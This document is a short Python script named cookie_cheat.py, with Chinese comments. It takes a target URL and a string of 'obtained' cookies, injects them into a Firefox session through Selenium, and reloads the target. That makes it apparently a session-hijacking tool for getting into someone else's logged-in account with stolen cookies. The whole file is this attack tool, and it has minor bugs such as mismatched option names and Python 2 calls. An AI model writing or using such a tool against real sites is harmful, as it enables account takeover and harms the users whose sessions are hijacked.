from selenium import webdriver
import urllib
import getopt
import sys

url = ''
cookies = ''


# 将获取到的cookie进行整理
def cookies_parse(cookies):
    parsed_cookies = []
    cookies = urllib.unquote(cookies)  # urldecode
    cookies = cookies.split(';')
    for cookie in cookies:
        cookie = cookie.strip()
        name = cookie.split('=')[0].replace(' ', '+')  # 将空格替换为+
        value = cookie.split('=')[1].replace(' ', '+')
        parsed_cookies.append({'name': name, 'value': value})
    return parsed_cookies


def cookie_cheat(url, cookies):
    driver = webdriver.Firefox()  # 调用Firefox浏览器
    driver.get(url)  # 访问目标url

    # selenium没有修改cookie的功能，只能删除然后添加
    driver.delete_all_cookies()  # 删除所有cookie
    for cookie in cookies:
        # print cookie
        driver.add_cookie(cookie)  # 添加获取到的cookie

    driver.get(url)  # 再次访问
    driver.close()


def main():
    global url
    global cookies

    # 命令行参数解析
    if not len(sys.argv[1:]):
        print('usage: python cookie_cheat.py -u target_url -c cookies')
        sys.exit(0)

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'u:c:', ['url', 'cookies'])
    except getopt.GetoptError as err:
        print(str(err))
        print('usage: python cookie_cheat.py -u target_url -c cookies')
        sys.exit(0)

    for o, a in opts:
        if o in ("-u", "--url"):
            url = a
        elif o in ("-c", "--cookie"):
            cookies = a
    ################

    cookies = cookies_parse(cookies)
    url = url if url.startswith('http://') else ('http://' + url)
    cookie_cheat(url, cookies)


if __name__ == '__main__':
    main()